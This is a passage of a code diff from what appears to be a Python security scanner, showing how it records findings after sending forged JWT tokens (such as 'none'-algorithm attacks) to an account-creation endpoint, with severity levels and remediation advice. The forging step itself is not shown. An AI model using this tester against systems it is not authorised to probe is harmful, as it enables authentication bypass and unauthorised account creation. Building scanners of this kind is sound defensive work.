+                        vulnerability=f"JWT {attack_type.capitalize()} Authentication Bypass",
+                        details=f"The application accepts forged JWT tokens using {attack_type} attack, allowing bypass of authentication requirements for account creation. This indicates a critical vulnerability in the JWT validation process.",
+                        severity="CRITICAL",
+                        endpoint=self.endpoint,
+                        evidence={
+                            "attack_type": attack_type,
+                            "forged_token": forged_token[:50] + "...",  # Truncate for readability
+                            "no_token_response": {
+                                "status_code": no_token_response.status_code,
+                                "body": no_token_response.text[:200] + ("..." if len(no_token_response.text) > 200 else "")
+                            },
+                            "forged_token_response": {
+                                "status_code": forged_token_response.status_code,
+                                "body": forged_token_response.text[:200] + ("..." if len(forged_token_response.text) > 200 else "")
+                            }
+                        },
+                        remediation="Implement proper JWT validation including signature verification, algorithm validation, and claims checking. Never accept 'none' algorithm tokens and ensure proper key management for asymmetric algorithms. Additionally, implement proper authentication checks before allowing account creation."
+                    )
+                else:
+                    self.logger.info("Authentication does not appear to be required for account creation")
+                    
+                    self.add_finding(
+                        vulnerability="Unrestricted Account Creation",
+                        details="The application allows account creation without proper authentication, which could lead to unauthorized account creation and potential abuse.",
+                        severity="HIGH",
+                        endpoint=self.endpoint,
+                        evidence={
+                            "no_token_response": {
+                                "status_code": no_token_response.status_code,
+                                "body": no_token_response.text[:200] + ("..." if len(no_token_response.text) > 200 else "")
+                            }
+                        },
+                        remediation="Implement proper authentication requirements before allowing account creation. This should include validating JWT tokens and ensuring that only authorized users can create accounts."
+                    )
+            else:
+                # Check response for JWT validation errors
+                response_text = forged_token_response.text.lower()
+                jwt_validation_indicators = [
+                    "invalid token", "invalid signature", "token invalid", "signature invalid",
+                    "jwt", "token expired", "malformed token", "algorithm not supported"
+                ]
+                
+                validation_error_found = False
+                for indicator in jwt_validation_indicators:
+                    if indicator in response_text:
+                        validation_error_found = True
+                        self.logger.info(f"JWT validation error detected: '{indicator}'")
+                        break
+                
+                if validation_error_found:
+                    self.logger.info(f"JWT {attack_type} attack failed - proper validation in place (this is good)")
+                else:
+                    self.logger.info(f"JWT {attack_type} attack failed, but no specific JWT validation error was detected")
+                    
+                    # If we didn't get a clear JWT validation error, add a low severity finding
+                    if forged_token_response.status_code >= 400:
+                        self.add_finding(
+                            vulnerability=f"Potential JWT Validation Issue",
+                            details=f"The application rejected the forged JWT token but did not return a specific JWT validation error. This might indicate that the token is being rejected for reasons other than proper JWT validation.",
+                            severity="LOW",
+                            endpoint=self.endpoint,
+                            evidence={
+                                "attack_type": attack_type,
+                                "forged_token": forged_token[:50] + "...",
+                                "response": {
+                                    "status_code": forged_token_response.status_code,
+                                    "body": forged_token_response.text[:200] + ("..." if len(forged_token_response.text) > 200 else "")
+                                }
+                            },
+                            remediation="Ensure proper JWT validation with clear error messages. Implement comprehensive JWT validation including signature verification, algorithm validation, and claims checking."
+                        )
+                    
+        except Exception as e:
+            self.logger.error(f"Error testing forged token for auth bypass: {str(e)}")
+            import traceback
+            self.logger.error(traceback.format_exc())
